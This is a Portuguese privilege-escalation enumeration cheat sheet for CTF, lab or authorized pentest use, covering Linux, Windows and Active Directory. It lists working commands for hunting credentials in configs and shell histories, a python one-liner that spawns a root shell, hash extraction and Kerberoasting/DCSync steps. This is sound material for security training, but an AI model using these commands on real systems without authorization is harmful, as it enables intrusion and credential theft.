# Escalação de privilégio — checklists de enumeração

Para CTF/laboratório, ou pentest com autorização explícita para pós-exploração. Enumere primeiro, explore
depois. Ferramentas automáticas (linpeas, winPEAS) ajudam, mas leia a saída com olho humano — e em
ambiente real, confirme com o usuário antes de subir qualquer binário para o alvo.

## Linux

```bash
id; hostname; uname -a; cat /etc/os-release        # quem sou, onde estou, kernel
sudo -l                                            # o que posso rodar como root?  (o mais comum em CTF)
find / -perm -4000 -type f 2>/dev/null             # binários SUID
getcap -r / 2>/dev/null                            # capabilities (cap_setuid em python = root)
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers   # tarefas agendadas
ps aux | grep -i root                               # processos do root (scripts graváveis?)
ss -tlnp                                           # serviços só em localhost (MySQL, painéis internos)
ls -la /home/* /root 2>/dev/null; cat ~/.bash_history
find / -writable -type f -not -path "/proc/*" 2>/dev/null | grep -v "^/sys"   # arquivos graváveis
grep -rniE "pass(word)?|secret|token" /var/www /opt /etc 2>/dev/null | head   # credenciais em configs
env; cat /etc/fstab; mount                         # variáveis e montagens (NFS no_root_squash?)
groups                                             # docker, lxd, disk, adm = caminho quase direto
```

| Achado | Caminho |
|---|---|
| `sudo -l` lista um binário | GTFOBins (gtfobins.github.io) → seção "Sudo" |
| SUID incomum (`find`, `vim`, `python`, `bash`…) | GTFOBins → seção "SUID" |
| `cap_setuid` em interpretador | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| Cron do root chamando script gravável | adicionar comando ao script (em lab) |
| Cron com wildcard (`tar *`) | injeção de argumentos via nomes de arquivo |
| Grupo `docker`/`lxd` | montar `/` do host num container |
| Senha em config/histórico | testar reuso: `su <usuario>`, `ssh`, banco de dados |
| Serviço interno em 127.0.0.1 | port forward: `ssh -L 8080:127.0.0.1:8080 user@alvo` |
| Kernel muito antigo | pesquisar exploit (último recurso: pode derrubar a máquina — nunca em produção) |
| PATH relativo em script/binário root | criar binário com mesmo nome num diretório anterior no PATH |

## Windows

```powershell
whoami /all                                    # privilégios (SeImpersonate, SeBackup, SeDebug…)
systeminfo                                     # versão/patches
net user; net localgroup administrators
cmdkey /list                                   # credenciais salvas (runas /savecred)
Get-ChildItem C:\ -Include *.config,*.xml,*.ini,*.txt -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Select -First 20
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon   # AutoLogon em texto puro
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
schtasks /query /fo LIST /v                    # tarefas agendadas
Get-CimInstance win32_service | ? {$_.PathName -notmatch '^"' -and $_.PathName -match ' '} | select Name,PathName   # caminho sem aspas
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

| Achado | Caminho |
|---|---|
| `SeImpersonatePrivilege` | família "Potato" (GodPotato, PrintSpoofer) |
| `SeBackupPrivilege` | copiar SAM/SYSTEM ou NTDS.dit e extrair hashes |
| Serviço com caminho sem aspas + pasta gravável | binário no caminho intermediário |
| Serviço com binário/permissão gravável | trocar binário / `sc config binPath=` |
| AlwaysInstallElevated = 1 (HKLM e HKCU) | MSI executa como SYSTEM |
| Credencial salva (`cmdkey`) | `runas /savecred` |
| Senha em histórico/unattend.xml | testar reuso |

## Active Directory (lab)

Ordem típica: usuários válidos (kerbrute, LDAP anônimo) → AS-REP roasting (`GetNPUsers.py`) →
credencial → BloodHound (`bloodhound-python`) → Kerberoasting (`GetUserSPNs.py`) → abuso de ACL/delegação
→ DCSync. Em ambiente corporativo real, cada passo após a primeira credencial precisa estar explicitamente
autorizado no escopo.
